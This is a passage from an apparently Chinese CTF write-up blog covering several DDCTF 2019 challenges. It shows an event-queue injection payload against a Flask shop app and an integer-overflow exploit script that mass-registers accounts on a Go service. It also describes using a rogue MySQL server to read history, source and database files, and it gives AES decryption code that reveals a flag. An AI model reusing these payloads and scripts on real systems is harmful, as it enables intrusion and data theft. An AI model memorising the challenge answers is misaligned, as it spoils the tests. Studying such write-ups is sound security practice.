class="number">5</span>: </span><br><span class="line">        trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries </span></span><br><span class="line">    trigger_event(<span class="string">'action:view;index'</span>) </span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">    app.run(debug=<span class="keyword">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure></p>
<p>flag获取条件：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span></span><span class="symbol">:</span></span><br><span class="line">	<span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span><span class="symbol">:</span></span><br><span class="line">		trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">	trigger_event(<span class="string">'action:view;index'</span>)</span><br></pre></td></tr></table></figure></p>
<p><code>num_items</code>是<strong>diamonds</strong>的数量，初始<strong>points</strong>3分，一分一个</p>
<p>将目标转到购买，截取发送与响应请求：<br>request：</p>
<blockquote>
<p>GET /d5af31f66741e857/?action:buy;5 HTTP/1.1<br>Host: 116.85.48.107:5002<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://116.85.48.107:5002/d5af31f66741e857/?action:view;shop" target="_blank" rel="noopener">http://116.85.48.107:5002/d5af31f66741e857/?action:view;shop</a><br>Connection: close<br>Cookie: session=eyJsb2ciOlt7IiBiIjoiWVdOMGFXOXVPblpwWlhjN2MyaHZjQT09In1dLCJudW1faXRlbXMiOjAsInBvaW50cyI6M30.D5pFbQ.Hb4GpdLm-zuQpVZkBSRlbY1B5i4<br>Upgrade-Insecure-Requests: 1</p>
</blockquote>
<p>response：</p>
<blockquote>
<p>HTTP/1.1 200 OK<br>Server: gunicorn/19.7.1<br>Date: Thu, 18 Apr 2019 17:48:50 GMT<br>Connection: close<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 113<br>Set-Cookie: session=.eJyrVsrJT1eyiq5WUkhSslKKDPczSAy3LPXP9TJMDSk2VKrVgUlF5YWVRlYVZCUZmValhBvmRBg7lSWGmxr4V4XaApWhG5AXVRAVkWwOVJEdFZEOVBEbq6OUV5obn1mSmlusZGWgo1SQn5lXAmQa1wIA440qLQ.D5pKAg.g3KyTELFqHt0j9fGhwyOR29FfmE; HttpOnly; Path=/</p>
<p>ERROR! All transactions have been cancelled. <br><a href="./?action:view;index">Go back to index.html</a><br></p>
</blockquote>
<p>将request的session进行base64解码：</p>
<blockquote>
<p>{“log”:[{“ b”:”YWN0aW9uOnZpZXc7c2hvcA==”}],”num_items”:0,”points”:6}[@vK;Vd$emA.</p>
</blockquote>
<p>大致可以确定目标，所以现在需要找到secret_key，尝试了一番，没有ssti，所以这个思路不对</p>
<ul>
<li>代码分析：</li>
<li><p>get_mid_str函数：</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def get_mid_str(haystack, <span class="keyword">prefix</span>, <span class="keyword">postfix</span>=<span class="type">None</span>):</span><br><span class="line">	haystack = haystack[haystack.<span class="built_in">find</span>(<span class="keyword">prefix</span>)+len(<span class="keyword">prefix</span>):]</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">postfix</span> <span class="keyword">is</span> not <span class="type">None</span>:</span><br><span class="line">		haystack = haystack[:haystack.<span class="built_in">find</span>(<span class="keyword">postfix</span>)]</span><br><span class="line">	<span class="keyword">return</span> haystack</span><br></pre></td></tr></table></figure>
</li>
<li><p>再定位到execute_event_loop()：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">while</span> <span class="title">len</span>(<span class="params">request.event_queue</span>) &gt; 0:</span></span><br><span class="line"><span class="function">		<span class="keyword">event</span> </span>= request.event_queue[<span class="number">0</span>] <span class="meta"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">		request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">		<span class="keyword">if</span> not <span class="keyword">event</span>.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> <span class="keyword">event</span>:</span><br><span class="line">			<span class="keyword">if</span> c not <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			is_action = <span class="keyword">event</span>[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">			action = get_mid_str(<span class="keyword">event</span>, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">			args = get_mid_str(<span class="keyword">event</span>, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>大致确定划分规则：<code>action:buy:1#;</code></p>
<ul>
<li><p>函数执行规则：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	event_handler = <span class="built_in">eval</span>(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">	ret_val = event_handler(<span class="keyword">args</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>trigger_event:</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def trigger_event(<span class="keyword">event</span>):</span><br><span class="line">	session[<span class="string">'log'</span>].append(<span class="keyword">event</span>)</span><br><span class="line">	<span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][-<span class="number">5</span>:]</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">type</span>(<span class="keyword">event</span>) == <span class="keyword">type</span>([]):</span><br><span class="line">		request.event_queue += <span class="keyword">event</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		request.event_queue.append(<span class="keyword">event</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>将event加入到session[‘log’],循环存入队列中：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@app.route(url_prefix+<span class="string">'/'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">	querystring = urllib.unquote(request.query_string)</span><br><span class="line">	request.event_queue = []</span><br><span class="line">	<span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span><span class="symbol">:</span></span><br><span class="line">		querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="symbol">session:</span></span><br><span class="line">		session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">		session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">		session[<span class="string">'log'</span>] = []</span><br><span class="line">	request.prev_session = dict(session)</span><br><span class="line">	trigger_event(querystring)</span><br><span class="line">	<span class="keyword">return</span> execute_event_loop()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>利用链则为：调用trigger_event,传入buy，得以纂改num_items，再调用get_flag_handler，获得flag<br>payload：<code>?action:trigger_event%23;action:buy;5%23action:get_flag;</code><br>最后将session进行破解可得<br>参考：<br><a href="https://www.smi1e.top/ddctf2019-%E4%B8%A4%E9%81%93web%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://www.smi1e.top/ddctf2019-%E4%B8%A4%E9%81%93web%E9%A2%98%E8%A7%A3/</a><br><a href="http://12end.xyz/ddctf-writeup/" target="_blank" rel="noopener">http://12end.xyz/ddctf-writeup/</a></p>
<h3 id="大吉大利，今晚吃鸡"><a href="#大吉大利，今晚吃鸡" class="headerlink" title="大吉大利，今晚吃鸡"></a>大吉大利，今晚吃鸡</h3><p>一个登录和注册页面，尝试注册登录，入场券2000，balance100，于是在订单和购买时进行各种抓包，发现在形成订单时，会有如下请求</p>
<blockquote>
<p>GET /ctf/api/buy_ticket?ticket_price=2000 HTTP/1.1<br>Host: 117.51.147.155:5050<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: application/json<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://117.51.147.155:5050/index.html" target="_blank" rel="noopener">http://117.51.147.155:5050/index.html</a><br>Connection: close<br>Cookie: user_name=shit; REVEL_SESSION=7af3ebc932b9a89f407e28a145433bb2</p>
</blockquote>
<p><strong>ticket_price</strong>可以更改，但只能改的比2000大，看了writeup，可以利用整数溢出，并且注意到一点：cookie中有<strong>revel-session</strong>字段，查了一下，所以这题是基于GoWeb，在go语言中：<br><img src="http://img.mukewang.com/5529fac20001b2f506320482.jpg" alt=""><br>各长度大小为：<br><img src="http://img.mukewang.com/552a276d0001663510160280.jpg" alt=""><br>传入<strong>4294967297</strong>，这里要注意的是，溢出发生在支付时，成功进入后，会分配一个id和ticket，然而得到flag的条件是：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419110834-6aedb18a-6250-1.png" alt=""><br>移除100个id和ticket，有个思路就是注册100个账户然后将他们删除：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#__author__=https://www.zhaoj.in/read-5269.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">main_session = requests.session()</span><br><span class="line"></span><br><span class="line">main_session.get(<span class="string">"http://38.106.21.229:5000/ctf/api/login?name=glzjinmiaomiao&amp;password=miaomiao"</span>)</span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_bot</span><span class="params">(id, ticket)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> main_session</span><br><span class="line"></span><br><span class="line">    print(main_session.get(<span class="string">"http://38.106.21.229:5000/ctf/api/get_flag"</span>).json())</span><br><span class="line"></span><br><span class="line">    print(main_session.get(<span class="string">"http://38.106.21.229:5000/ctf/api/remove_robot?id="</span> + str(id) + <span class="string">"&amp;ticket="</span> + str(ticket)).json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_bot</span><span class="params">(index=<span class="number">1</span>)</span>:</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line"></span><br><span class="line">    s.get(<span class="string">'http://38.106.21.229:5000/ctf/api/register?name=glzjinb4ot'</span> + str(index) + <span class="string">'&amp;password=12345678'</span>)</span><br><span class="line"></span><br><span class="line">    r = s.get(<span class="string">'http://38.106.21.229:5000/ctf/api/buy_ticket?ticket_price=4294967296'</span>)</span><br><span class="line"></span><br><span class="line">    r = s.get(<span class="string">"http://38.106.21.229:5000/ctf/api/pay_ticket?bill_id="</span> + r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_id'</span>], r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_ticket'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_and_remove</span><span class="params">(index=<span class="number">1</span>)</span>:</span></span><br><span class="line">    info = create_bot(index)</span><br><span class="line">    remove_bot(info[<span class="number">0</span>], info[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">    pool.submit(create_and_remove, i)</span><br><span class="line"></span><br><span class="line">pool.shutdown(<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h3><p><img src="https://i.imgur.com/DPT4FUl.png" alt=""><br>agent.py代码如下：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Time</span>    : 12/1/2019 2:58 PM</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>  : fz</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Site</span>    : </span></span><br><span class="line"><span class="comment"># <span class="doctag">@File</span>    : agent.py</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Software</span>: PyCharm</span></span><br><span class="line"></span><br><span class="line">import json</span><br><span class="line">from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler</span><br><span class="line">from optparse import OptionParser</span><br><span class="line">from subprocess import Popen, PIPE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RequestHandler</span>(<span class="title">BaseHTTPRequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        request_path = <span class="keyword">self</span>.path</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"\n----- Request Start -----&gt;\n"</span>)</span><br><span class="line">        print(<span class="string">"request_path :"</span>, request_path)</span><br><span class="line">        print(<span class="string">"self.headers :"</span>, <span class="keyword">self</span>.headers)</span><br><span class="line">        print(<span class="string">"&lt;----- Request End -----\n"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">        <span class="keyword">self</span>.send_header(<span class="string">"Set-Cookie"</span>, <span class="string">"foo=bar"</span>)</span><br><span class="line">        <span class="keyword">self</span>.end_headers()</span><br><span class="line"></span><br><span class="line">        result = <span class="keyword">self</span>._func()</span><br><span class="line">        <span class="keyword">self</span>.wfile.write(json.dumps(result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_POST</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        request_path = <span class="keyword">self</span>.path</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print("\n----- Request Start -----&gt;\n")</span></span><br><span class="line">        print(<span class="string">"request_path : %s"</span>, request_path)</span><br><span class="line"></span><br><span class="line">        request_headers = <span class="keyword">self</span>.headers</span><br><span class="line">        content_length = request_headers.getheaders(<span class="string">'content-length'</span>)</span><br><span class="line">        length = int(content_length[<span class="number">0</span>]) <span class="keyword">if</span> content_length <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print("length :", length)</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">"request_headers : %s"</span> % request_headers)</span><br><span class="line">        print(<span class="string">"content : %s"</span> % <span class="keyword">self</span>.rfile.read(length))</span><br><span class="line">        <span class="comment"># print("&lt;----- Request End -----\n")</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">        <span class="keyword">self</span>.send_header(<span class="string">"Set-Cookie"</span>, <span class="string">"foo=bar"</span>)</span><br><span class="line">        <span class="keyword">self</span>.end_headers()</span><br><span class="line">        result = <span class="keyword">self</span>._func()</span><br><span class="line">        <span class="keyword">self</span>.wfile.write(json.dumps(result))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_func</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        netstat = Popen([<span class="string">'netstat'</span>, <span class="string">'-tlnp'</span>], stdout=PIPE)</span><br><span class="line">        netstat.wait()</span><br><span class="line"></span><br><span class="line">        ps_list = netstat.stdout.readlines()</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> ps_list[<span class="number">2</span><span class="symbol">:</span>]<span class="symbol">:</span></span><br><span class="line">            tmp = item.split()</span><br><span class="line">            Local_Address = tmp[<span class="number">3</span>]</span><br><span class="line">            Process_name = tmp[<span class="number">6</span>]</span><br><span class="line">            tmp_dic = &#123;<span class="string">'local_address'</span>: Local_Address, <span class="string">'Process_name'</span>: Process_name&#125;</span><br><span class="line">            result.append(tmp_dic)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    do_PUT = do_POST</span><br><span class="line">    do_DELETE = do_GET</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    port = <span class="number">8123</span></span><br><span class="line">    print(<span class="string">'Listening on localhost:%s'</span> % port)</span><br><span class="line">    server = HTTPServer((<span class="string">'0.0.0.0'</span>, port), RequestHandler)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">"__main__"</span><span class="symbol">:</span></span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.usage = (</span><br><span class="line">        <span class="string">"Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\n"</span></span><br><span class="line">        <span class="string">"Run:\n\n"</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<p>要求将他配置在自己的服务器上，代码功能分为三部分，读取get请求（do_GET），读取post请求（do_POST），端口状态检测（_func），启动后会将端口绑定在本地的<strong>8123</strong>端口进行监听</p>
<p>httpserver：</p>
<blockquote>
<p>class http.server.<strong>HTTPServer</strong>(server_address, RequestHandlerClass)<br>This class builds on the TCPServer class by storing the server address as instance variables named server_name and server_port. The server is accessible by the handler, typically through the handler’s server instance variable.</p>
</blockquote>
<p>BaseHTTPRequestHandler：</p>
<blockquote>
<p>class http.server.<strong>BaseHTTPRequestHandler</strong>(request, client_address, server)<br>This class is used to handle the HTTP requests that arrive at the server. By itself, it cannot respond to any actual HTTP requests; it must be subclassed to handle each request method (e.g. GET or POST). BaseHTTPRequestHandler provides a number of class and instance variables, and methods for use by subclasses.</p>
</blockquote>
<p>需要注意的是agent.py中的Process_name需要含有mysqld，直接改源码，端口写3306，然后跑<a href="https://github.com/allyshka/Rogue-MySql-Server中的脚本即可。" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server中的脚本即可。</a><br><img src="https://upload-images.jianshu.io/upload_images/9113969-12aa8b88d8b2b321.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>接下来就是找flag，可以直接读～/.mysql_history（注：这方法在后期复现时已经不管用了）<br><img src="https://upload-images.jianshu.io/upload_images/9113969-0b6d72ebf211f0f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>或者读取~/.bash_history，找到工作目录，读源码<br><img src="https://upload-images.jianshu.io/upload_images/9113969-7a3a9391b3c2c4bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-39fafc2acb6c5e68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>/home/dc2-user/ctf_web_2/app/main/views.py<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-<span class="number">8</span></span><br><span class="line">from flask <span class="keyword">import</span> jsonify, request</span><br><span class="line">from struct <span class="keyword">import</span> unpack</span><br><span class="line">from socket <span class="keyword">import</span> inet_aton</span><br><span class="line"><span class="keyword">import</span> MySQLdb</span><br><span class="line">from subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"># flag <span class="built_in">in</span> mysql  curl@localhost database:security  table:flag</span><br><span class="line">def weak_scan():</span><br><span class="line">    agent_port = <span class="number">8123</span></span><br><span class="line">    result = []</span><br><span class="line">    target_ip = request.args.get(\<span class="string">'target_ip\'</span>)</span><br><span class="line">    target_port = request.args.get(\<span class="string">'target_port\'</span>)</span><br><span class="line">.......</span><br></pre></td></tr></table></figure></p>
<p>可以看到flag在security库flag表中。<br>my.cnf<br><img src="https://upload-images.jianshu.io/upload_images/9113969-cbbd8649f1a05f3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>/var/lib/mysql/security/flag.ibd<br><img src="https://upload-images.jianshu.io/upload_images/9113969-7dc23daf844d02e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="北京地铁"><a href="#北京地铁" class="headerlink" title="北京地铁"></a>北京地铁</h3><blockquote>
<p>Color Threshold</p>
<p>提示：AES ECB密钥为小写字母<br>提示2：密钥不足位用\0补全<br>提示3：不要光记得隐写不看图片本身啊…</p>
</blockquote>
<p><strong>颜色阈值：可以命令将灰度或彩色图像转换为高对比度的黑白图像。</strong></p>
<p>用stegsolve查看图片，lsb，发现一段base64，但是为不可见字符<br><img src="https://impakho.com/images/f0622488ab8ec745dc68568fe54c0905.png" alt=""></p>
<p>用ps打开图片，调整阀值，发现了<strong>魏公村</strong>这个站点有点特殊：<br><img src="https://impakho.com/images/39a3fb90b4177c0095d3c0c283a26916.png" alt=""><br>这里似乎有两种情况，在lsb和rsb情况下的base64不同：</p>
<h4 id="lsb"><a href="#lsb" class="headerlink" title="lsb"></a>lsb</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher import AES</span><br><span class="line"><span class="keyword">from</span> base64 import *</span><br><span class="line"></span><br><span class="line"><span class="attribute">cipher</span>=b64decode('7SsQWmZ524i/yVWoMeAIJA==')</span><br><span class="line"><span class="attribute">key</span>=<span class="string">'weigongcun'</span>.ljust(16,'\x00')</span><br><span class="line"><span class="attribute">mode</span>=AES.MODE_ECB</span><br><span class="line"></span><br><span class="line"><span class="attribute">c</span>=AES.new(key, mode)</span><br><span class="line"><span class="builtin-name">print</span> c.decrypt(cipher)</span><br></pre></td></tr></table></figure>
<h4 id="rgb"><a href="#rgb" class="headerlink" title="rgb"></a>rgb</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">k=<span class="string">"iKk/Ju3vu4wOnssdIaUSrg=="</span></span><br><span class="line">k=k.decode(<span class="string">"base64"</span>)</span><br><span class="line">kirin=AES.new(<span class="string">"weigongcun\x00\x00\x00\x00\x00\x00"</span>,AES.MODE_ECB)</span><br><span class="line">print kirin.decrypt(k)</span><br><span class="line"><span class="comment">#DDCTF&#123;CD*Q23&amp;0&#125;</span></span><br></pre></td></tr></table></figure>
